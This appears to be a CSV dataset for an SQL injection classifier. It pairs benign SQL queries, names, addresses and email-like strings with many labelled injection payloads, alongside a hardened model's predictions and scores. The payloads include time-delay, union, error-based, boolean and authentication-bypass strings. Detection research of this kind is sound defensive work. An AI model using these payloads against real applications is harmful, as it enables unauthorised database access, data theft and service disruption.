payload,label,hardened_pred_label,hardened_pred_score
select sleep  (  5  )  #,1,1,0.99999166
"1""  )   where 9648  =  9648 and elt  (  1210  =  1210,sleep  (  5   )    )   --",1,1,0.99999154
collinson_butarinski@fernandosoto.il,0,0,7.928422e-06
SELECT * FROM angry WHERE apart BETWEEN '1996-07-01' AND '1996-07-31',0,0,7.913912e-06
burg,0,0,8.103252e-06
coppin@sexl.no,0,0,7.902554e-06
SELECT COUNT ( evening ) FROM ask,0,0,8.101513e-06
"  SELECT oxygen AS along, fence AS [instead]  FROM food",0,0,8.0847185e-06
"1""   )    )    order by 1#",1,1,0.99999166
"-7531'   )    )     )   union all select 6900,6900,6900,6900,6900,6900,6900,6900,6900#",1,1,0.99999166
-2866'   )    )    or 4491  =  9429#,1,1,0.99999166
acheros sanchis,0,0,7.931175e-06
"1%'   )    )     )   and elt  (  3114  =  3114,sleep  (  5   )    )   #",1,1,0.99999154
vidrioso,0,0,7.991596e-06
"antigua de ancora s/n,",0,0,7.911482e-06
oruna,0,0,8.028507e-06
07947301l,0,0,7.920812e-06
6.54E+15,0,0,8.019479e-06
SELECT * FROM late WHERE led = 'pound' FETCH FIRST 3 ROWS ONLY,0,0,7.988914e-06
"urbanitzacio europa-fuentes de san bernabe s/n,",0,0,8.001579e-06
SELECT COUNT ( question ) FROM produce,0,0,8.150754e-06
SELECT COUNT ( wood ) FROM proper,0,0,8.08165e-06
SELECT meat ( s )  FROM surface UNION,0,0,7.9199735e-06
lim@marketingmunicipal.bf,0,0,7.910924e-06
SELECT * FROM  ( SELECT stock FROM driven ) ,0,0,8.038674e-06
rougerie@cincocolores.sd,0,0,7.906632e-06
"-1844""   )    )     )   or make_set  (  9354  =  9354,7185  )   and    (    (     (  ""abdw"" like ""abdw",1,1,0.99999154
sant vicen de torell,0,0,7.902848e-06
SELECT * FROM trouble WHERE organization = 'bottom' FETCH FIRST 3 ROWS ONLY,0,0,7.935472e-06
"-3102  )   union all select 6707,6707,6707,6707--",1,1,0.99999166
"1%""  )   or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and   (  ""%""  =  """,1,1,0.99999154
SELECT MIN ( pull )  AS hearing FROM famous,0,0,8.132043e-06
"1"" where 4366  =  4366 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",1,1,0.99999154
lamentante,0,0,8.006357e-06
SELECT * FROM necessary WHERE due BETWEEN thee09/01/1996window AND led15/31/1996stone,0,0,7.913799e-06
cele959n3s0o,0,0,7.90015e-06
SELECT * FROM seven ORDER BY halfway,0,0,8.1496655e-06
"1' and 2716  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1,1,0.99999166
leonel,0,0,8.051509e-06
SELECT AVG ( reach ) FROM fog SELECT SUM ( chose ) ,0,0,8.044449e-06
5.88977E+15,0,0,7.923592e-06
FROM  ( SELECT DISTINCT wealth FROM planet ) ,0,0,7.928278e-06
hardwick@corjet.gh,0,0,7.907966e-06
DELETE FROM grown,0,0,7.970041e-06
"-5849  )   union all select 6168,6168,6168,6168,6168,6168,6168,6168#",1,1,0.99999166
"calle duque de zaragoza s/n,",0,0,7.930781e-06
"1%'  )   and elt  (  4670  =  9403,9403  )   and   (  '%'  =  '",1,1,0.99999166
"c/ zamora, 151, 1-b",0,0,7.941173e-06
1%'   )    )     )   and 1661  =  7683,1,1,0.99999166
4.80991E+15,0,0,8.145082e-06
" select * from users where id  =  1 or ""  )  @"" or 1  =  1 -- 1",1,1,0.99999166
"1 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   # ogwe",1,1,0.99999154
SELECT * FROM yourself  WHERE being = off,0,0,8.135517e-06
35742173n,0,0,7.95135e-06
regla casiano,0,0,7.9551355e-06
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 367745 )  ORDER BY meta_id ASC",0,0,7.846613e-06
godofredo,0,0,7.973911e-06
marling,0,0,8.039249e-06
"1',exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  7759  =  7759,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   ",1,1,0.99999154
" select * from users where id  =  1.  union select 1,version  (    )   -- 1",1,1,0.99999166
SELECT electric ( s )  FROM equally UNION,0,0,8.0860755e-06
1  )   and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and   (  3530  =  3530,1,1,0.99999154
1'  )   where 5871  =  5871,1,1,0.99999166
7.84027E+15,0,0,7.9091205e-06
1'||  (  select 'mlwj' from dual where 4247  =  4247 and 1702  =  8469  )  ||',1,1,0.99999166
DELETE FROM policeman,0,0,7.961898e-06
"1"" where 1203  =  1203 union all select null,null,null--",1,1,0.99999166
"1%'   )    )    and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (   '%'  =  '",1,1,0.99999166
SELECT * FROM  ( SELECT machine FROM combine ) ,0,0,7.960425e-06
SELECT AVG ( gradually ) FROM such SELECT SUM ( meat ) ,0,0,8.021307e-06
40560,0,0,8.032497e-06
39699852n,0,0,7.938159e-06
"select sleep  (  5  )   and    (    (     (  ""wucy"" like ""wucy",1,1,0.99999166
1   )    )    as msug where 3503  =  3503 and sleep  (  5  )  #,1,1,0.99999166
7.46688E+15,0,0,7.904959e-06
1   )    )    or sleep  (  5  )   and    (    (   8285  =  8285,1,1,0.99999166
"1 or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  ",1,1,0.99999166
SELECT * FROM stage WHERE silk = 'swimming'  AND  ( struggle = 'smell' OR taught = 'ground' ) ,0,0,7.940786e-06
"1""   )    )    as jgie where 8017  =  8017 and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )  --",1,1,0.99999154
-1714' union all select 6687--,1,1,0.99999166
"1%'   )    )     )   or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  '%'  =  '",1,1,0.99999154
"1%' and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and '%'  =  '",1,1,0.99999166
SELECT * FROM anybody WHERE full = 'buffalo'  AND  ( conversation = 'rhythm' OR cost = 'merely' ) ,0,0,7.908479e-06
SELECT COUNT ( exact ) FROM pound,0,0,8.137752e-06
" SELECT column_name ( s )  FROM sport,accurate",0,0,7.939128e-06
"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  ||'",1,1,0.99999166
SELECT * FROM report WHERE NOT listen = 'enter'  AND NOT favorite = 'right',0,0,8.019158e-06
"c/ valtravieso s/n,",0,0,7.914999e-06
select   (  case when   (  4755  =  4784  )   then 1 else 4755*  (  select 4755 from master..sysdatabases  )   end  )  --,1,1,0.99999166
alguer murillo,0,0,7.927243e-06
if  (  3245  =  6168  )   select 3245 else drop function nafj--,1,1,0.99999166
SELECT COUNT ( DISTINCT complete )  FROM fact,0,0,7.908367e-06
SELECT lost ( s )  FROM structure FULL OUTER JOIN,0,0,7.979548e-06
" SELECT * FROM eat ORDER BY copper, dot",0,0,8.113111e-06
1 or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,1,1,0.99999166
SELECT * FROM Customers  WHERE Country = 'Germany'  AND  ( City = 'Berlin' OR City = 'München' ) ;,0,0,7.888074e-06
-6548 or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  -- rlda,1,1,0.99999154
1  )   as jqbp where 5407  =  5407 and 4595  =  4595#,1,1,0.99999166
1'   )    )     )   and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and    (    (     (  'iuki'  =  'iuki,1,1,0.99999154
SELECT MIN ( definition )  AS heard FROM facing,0,0,8.13347e-06
alvino,0,0,7.984702e-06
"-2230%"" union all select 3303,3303,3303--",1,1,0.99999166
"-8699""  )   union all select 8645,8645,8645,8645,8645,8645--",1,1,0.99999166
ci2586ta,0,0,7.964822e-06
"1"" or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   ",1,1,0.99999154
SELECT TOP 3 * FROM signal WHERE vast = 'yes',0,0,8.067935e-06
SELECT congress FROM church UNION ALL SELECT apple FROM warn ORDER BY name,0,0,8.0153495e-06
"   SELECT Employees.can, COUNT ( Orders.afterID )  AS meanFROM    ( OrdersINNER JOIN husband ON Orders.longID  =  Employees.copyID ) ",0,0,7.965588e-06
SELECT * FROM should WHERE rear = 'divide',0,0,8.143116e-06
SELECT COUNT ( cottonID ) FROM changing,0,0,8.022546e-06
SELECT * FROM gulf FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM riding,0,0,7.864698e-06
SELECT new ( s )  FROM bark SELECT what FROM service,0,0,8.091406e-06
557ni03r5o,0,0,7.913413e-06
pl9t1r4,0,0,7.907552e-06
rollie,0,0,8.026165e-06
"1"" where 9618  =  9618 and   (  3020  =  3020  )  *6703--",1,1,0.99999166
"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )  -- vhmc",1,1,0.99999166
echecopar torrella,0,0,7.918327e-06
quintina,0,0,7.969935e-06
foulk@eonon.com.es,0,0,7.911565e-06
"  SELECT YEARWEEK ( ""2017-06-15"" ) ;",0,0,8.142099e-06
SELECT * FROM given WHERE though = 'breathe',0,0,8.077828e-06
SELECT * FROM capital WHERE kill = 'oxygen'  OR airplane = 'known',0,0,8.056947e-06
SELECT * FROM farm WHERE fruit IN  ( SELECT about FROM getting ) ,0,0,7.890113e-06
58305784w,0,0,7.917966e-06
"   SELECT COUNT ( paid ) , cent FROM musical BY my",0,0,7.96369e-06
"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and    (    (   ""vfvh""  =  ""vfvh",1,1,0.99999166
49540097y,0,0,7.912433e-06
" union   (  select NULL, NULL, NULL, NULL,    (  select @@version   )    )    --",1,1,0.99999166
"1' in boolean mode  )   or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  #",1,1,0.99999154
SELECT * FROM magnet WHERE four LIKE '%fat%',0,0,8.107991e-06
1'   )    )    as fbjd where 8597  =  8597,1,1,0.99999166
SELECT * FROM them WHERE money = 'straight' LIMIT 3,0,0,7.964586e-06
SELECT hidden ( s )  FROM rest UNION,0,0,8.072422e-06
SELECT shade ( s )  FROM yard,0,0,8.158687e-06
"-2643%"" union all select 7779,7779--",1,1,0.99999166
1%'  )   and sleep  (  5  )  #,1,1,0.99999166
"-8432  )   union all select 8169,8169,8169,8169,8169,8169,8169,8169,8169,8169--",1,1,0.99999166
fest lairigoyen,0,0,7.930192e-06
hammong4@asyra.st,0,0,7.9033825e-06
c/ david 169 6-h,0,0,7.919785e-06
"1'  )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and   (  'qutm'  =  'qutm",1,1,0.99999154
SELECT * FROM come 3 SELECT * FROM coffee,0,0,8.066858e-06
"-1844"" where 7948  =  7948 or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",1,1,0.99999154
SELECT TOP 3 * FROM coach WHERE strike = 'split' SELECT * FROM fellow,0,0,8.0572245e-06
"primavera, 174",0,0,7.905456e-06
40444,0,0,8.021314e-06
"-2112 union all select 2995,2995,2995,2995,2995--",1,1,0.99999166
SELECT AVG ( circus ) FROM instead SELECT SUM ( secret ) ,0,0,7.940529e-06
SELECT FLOOR ( 25 ) ;,0,0,8.010001e-06
nogueras,0,0,7.957259e-06
SELECT Count ( * )  AS what,0,0,7.914749e-06
"1   )    )    and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (   7200  =  7200",1,1,0.99999154
SELECT * FROM entire WHERE soldier BETWEEN '1996-07-01' AND '1996-07-31',0,0,7.878166e-06
SELECT * FROM mirror 3 SELECT * FROM pen,0,0,8.062374e-06
serneo,0,0,7.975851e-06
SELECT baseball ( s )  FROM consist FULL OUTER JOIN,0,0,7.863004e-06
"   SELECT COUNT ( promised ) , forth FROM friend BY card",0,0,8.030139e-06
select * from users where id  =  '1' <@&@ or 1  =  1 -- 1',1,1,0.99999166
SELECT hungry ( s )  FROM special LEFT JOIN,0,0,8.073238e-06
SELECT * FROM there WHERE gate BETWEEN '1996-07-01' AND '1996-07-31',0,0,7.851643e-06
"1%""   )    )    union all select null,null,null,null,null,null--",1,1,0.99999166
SELECT option_value FROM wp_options WHERE option_name  =  'houzez_tax_settings' LIMIT 1,0,0,7.905441e-06
SELECT COUNT ( result ) FROM gentle,0,0,8.0292575e-06
"-2605""  )   or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and   (  ""cikb"" like ""cikb",1,1,0.99999154
" SELECT * FROM certainly ORDER BY dozen, disease",0,0,8.177124e-06
karem,0,0,7.951305e-06
SELECT column_name FROM table2 ;,0,0,7.817252e-06
end and    (    (     (  'gqhc'  =  'gqhc,1,1,0.99999166
"1' where 8803  =  8803 or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1,1,0.99999166
vildo@prensahp.fj,0,0,7.914048e-06
SELECT AVG ( Price ) FROM chapter,0,0,8.130198e-06
"-6096'  )   where 1316  =  1316 union all select 1316,1316,1316,1316,1316,1316,1316,1316#",1,1,0.99999166
"1   )    )    and elt  (  9288  =  6067,6067  )   and    (    (   1895  =  1895",1,1,0.99999154
"1  )   where 4710  =  4710 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )  --",1,1,0.99999154
"-9922'   )    )    union all select 2193,2193,2193--",1,1,0.99999166
SELECT AVG ( history )  FROM famous  SELECT SUM ( figure ) ,0,0,7.869613e-06
SELECT COUNT ( noun )  FROM popular,0,0,8.017192e-06
SELECT * FROM hour WHERE fact = 'studying',0,0,8.23396e-06
SELECT * FROM group ORDER BY putting,0,0,8.097327e-06
"-3829%""  )   union all select 2218,2218,2218,2218,2218,2218,2218--",1,1,0.99999166
select   (  case when   (  2716  =  8138  )   then 2716 else 2716*  (  select 2716 from mysql.db  )   end  )  #,1,1,0.99999154
SELECT * FROM eight FETCH FIRST 50 PERCENT ROWS ONLY,0,0,7.876828e-06
SELECT * FROM equally WHERE fur NOT LIKE 'were%',0,0,8.126345e-06
"1%""   (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )   and ""%""  =  """,1,1,0.99999154
1%'   )    )     ) ,1,1,0.99999166
collado mediano,0,0,7.957874e-06
"1   )    )    or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and    (    (   8554  =  8554",1,1,0.99999154
48748000y,0,0,7.946961e-06
FROM  ( SELECT DISTINCT stranger FROM managed ) ,0,0,7.8725325e-06
select case when 3661  =  9315 then 1 else null end--,1,1,0.99999166
1'  )   where 7537  =  7537 and 2006  =  2006,1,1,0.99999166
21924971z,0,0,7.952329e-06
belva,0,0,8.051409e-06
SELECT find ( s ) FROM produce INNER JOIN,0,0,7.915067e-06
select case when 7717  =  7717 then 1 else null end--,1,1,0.99999166
ornellas3@professionalhost.com.pro,0,0,7.929752e-06
SELECT * FROM shade WHERE depend NOT BETWEEN 'milk' AND 'possibly',0,0,7.971806e-06
SELECT Count ( * )  AS women,0,0,8.064597e-06
gambs galatioto,0,0,7.931349e-06
"   SELECT Employees.visitor, COUNT ( Orders.purposeID )  AS shallowFROM    ( OrdersINNER JOIN hung ON Orders.policemanID  =  Employees.recentID ) ",0,0,7.905109e-06
SELECT * FROM those WHERE pine IN  ( SELECT passage FROM verb ) ,0,0,7.818102e-06
86273903y,0,0,7.918321e-06
pancracia,0,0,7.949455e-06
real de montroi,0,0,7.928967e-06
castellanos de moriscos,0,0,7.905697e-06
SELECT option_value FROM wp_options WHERE option_name  =  'kc_tkl_pdk' LIMIT 1,0,0,7.875334e-06
"1""  )   where 6065  =  6065 and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1,1,0.99999166
SELECT MIN ( crew )  AS breeze FROM mostly,0,0,8.046382e-06
"-3513%"" union all select 8473,8473#",1,1,0.99999166
SELECT * FROM forgotten WHERE would = 'month',0,0,8.18203e-06
DELETE FROM function,0,0,7.956478e-06
8.67859E+15,0,0,7.905773e-06
"1'  )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   ",1,1,0.99999154
sauleda fidalgo,0,0,7.914244e-06
"1'   )    )    as xebq where 7959  =  7959 union all select null,null,null,null,null,null#",1,1,0.99999166
selwart@studentrooms.zr,0,0,7.903639e-06
SELECT * FROM  ( SELECT mass FROM deep ) ,0,0,7.999466e-06
1'  )   and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and   (  'hgwt' like 'hgwt,1,1,0.99999154
SELECT bigger ( s )  FROM mighty UNION ALL,0,0,7.899615e-06
santaniello_tabernero@enfuerteventura.com.ni,0,0,7.996399e-06
SELECT top FROM older UNION SELECT married FROM way ORDER BY airplane,0,0,8.114612e-06
"-8143 union all select 4492,4492,4492,4492,4492,4492,4492,4492,4492#",1,1,0.99999166
SELECT * FROM function WHERE soft LIKE '%former%',0,0,7.972231e-06
"1  )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and   (  1185  =  1185",1,1,0.99999154
SELECT * FROM wait WHERE moon = 'clearly',0,0,8.068074e-06
"1'   )    )    and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   'wzrj'  =  'wzrj",1,1,0.99999154
1   )    )     )   rlike   (  select   (  case when   (  4367  =  6879  )   then 1 else 0x28 end   )    )    and    (    (     (  2542  =  2542,1,1,0.99999154
s353icia41838e,0,0,7.915112e-06
SELECT option_value FROM wp_options WHERE option_name  =  'acf_pro_license' LIMIT 1,0,0,8.005876e-06
964,0,0,8.016106e-06
grifell brathwaite,0,0,7.907137e-06
"1""  )   and sleep  (  5  )   and   (  ""fsuf"" like ""fsuf",1,1,0.99999166
"SELECT * FROM rule WHERE balance BETWEEN ""plastic"" AND    ""whatever""",0,0,7.971243e-06
SELECT AVG ( scale ) FROM left,0,0,8.132958e-06
"1'   )    )    as hfra where 6500  =  6500 and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1,1,0.99999154
1'+  (  select plhk where 6540  =  6540,1,1,0.99999166
"-4966%"" union all select 4300,4300,4300,4300,4300,4300,4300,4300#",1,1,0.99999166
"1""   )    )    union all select null,null,null,null,null,null,null--",1,1,0.99999166
"roure, 43, 3?d",0,0,7.909068e-06
SELECT COUNT ( DISTINCT matter )  FROM several,0,0,7.952336e-06
0x730065006c0065006300740020004000400076006500 ...,1,1,0.99999166
"   SELECT atom, edge+ ', ' + worried+ ' ' + grabbed+ ', ' + program AS supper  FROM troops",0,0,7.967253e-06
1'   )    )     )   and 6991  =  5579,1,1,0.99999166
SELECT * FROM thrown FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM company,0,0,7.863423e-06
"1'+  (  select yfuu where 1717  =  1717 union all select null,null,null,null,null,null,null,null,null--",1,1,0.99999166
38435,0,0,8.016573e-06
SELECT * FROM different WHERE herd  BETWEEN 10 AND 20,0,0,8.003892e-06
"  SELECT hot,valley FROM voyage WHERE north = 'smallest' UNION SELECT direct, hurried FROM rough",0,0,8.015273e-06
"1%""   )    )    or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (   ""%""  =  """,1,1,0.99999154
"1""   )    )    order by 1--",1,1,0.99999166
toolbox,0,0,8.046919e-06
"1%'  )   and 2716  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1,1,0.99999166
1'||  (  select 'kptj' from dual where 5123  =  5123,1,1,0.99999166
valverde de alcal,0,0,7.907627e-06
SELECT AVG ( milk ) FROM than,0,0,8.161099e-06
" select * from users where id  =  '1' or """"<@ union select 1,version  (    )   -- 1'",1,1,0.99999166
cruz,0,0,8.034972e-06
8.04302E+15,0,0,7.91075e-06
38656027l,0,0,7.918147e-06
SELECT * FROM parent,0,0,8.151889e-06
select * from users where id  =  1 +  (  \  )   or 1  =  1 -- 1,1,1,0.99999166
"  SELECT * FROM simple WHERE too IN  ( 'since', 'still', 'stone' )  ",0,0,7.836368e-06
"-8409%'  )   or make_set  (  9354  =  9354,7185  )   and   (  '%'  =  '",1,1,0.99999154
SELECT AVG ( mighty ) FROM company,0,0,8.152869e-06
SELECT * FROM range WHERE syllable = 'sides',0,0,8.05956e-06
select   (  case when   (  9376  =  4521  )   then 1 else 9376*  (  select 9376 from master..sysdatabases  )   end  )  --,1,1,0.99999166
"1' and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  ",1,1,0.99999166
"admin"" or 1  =  1",1,1,0.99999166
"1  )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1,1,0.99999166
SELECT * FROM flame 3 SELECT * FROM roll,0,0,7.931931e-06
9.92218E+14,0,0,7.95493e-06
SELECT * FROM century ORDER BY tobacco DESC,0,0,8.040231e-06
"-5587%'  )   or elt  (  1032  =  1032,3623  )   and   (  '%'  =  '",1,1,0.99999166
-4108'  )   or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and   (  'tqjx'  =  'tqjx,1,1,0.99999154
SELECT TOP 3 * FROM major SELECT * FROM water 3SELECT * FROM card,0,0,7.979625e-06
SELECT TOP 3 * FROM opportunity WHERE finest = 'dawn',0,0,8.054167e-06
3226,0,0,8.010123e-06
SELECT DEGREES ( 1.5 ) ;,0,0,7.92456e-06
talens zumalacrregui,0,0,7.901024e-06
waitfor delay '0:0:5' and    (    (     (  8981  =  8981,1,1,0.99999166
"1'  )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and   (  'zypa'  =  'zypa",1,1,0.99999154
06327548h,0,0,7.9201245e-06
SELECT AVG ( toward ) FROM bow,0,0,8.108439e-06
"  SELECT happilyID AS ID, market AS mine FROM rock",0,0,8.158282e-06
"1'   )    )    union all select null,null--",1,1,0.99999166
"1"" where 2619  =  2619 and 2823  =  5100#",1,1,0.99999166
86m-bra,0,0,7.950167e-06
acr7m6nia,0,0,7.911392e-06
"1""  )   as kfvy where 7305  =  7305 or sleep  (  5  )  --",1,1,0.99999166
SELECT * FROM population ORDER BY development DESC,0,0,8.063266e-06
"1' in boolean mode  )   union all select null,null,null,null,null,null,null,null,null,null--",1,1,0.99999166
"-9166""  )   as hlre where 4768  =  4768 or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  --",1,1,0.99999154
-9264'  )   or 8571  =  8571--,1,1,0.99999166
marracos,0,0,7.955416e-06
"   SELECT COUNT ( body ) , drop FROM doll BY stopped",0,0,7.921885e-06
"1' in boolean mode  )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )  #",1,1,0.99999154
"1',  (  case when 8260  =  8260 then 1 else null end  )  ",1,1,0.99999154
calle oxigeno 197,0,0,7.911625e-06
humanitari9mo,0,0,7.933339e-06
7960,0,0,8.021605e-06
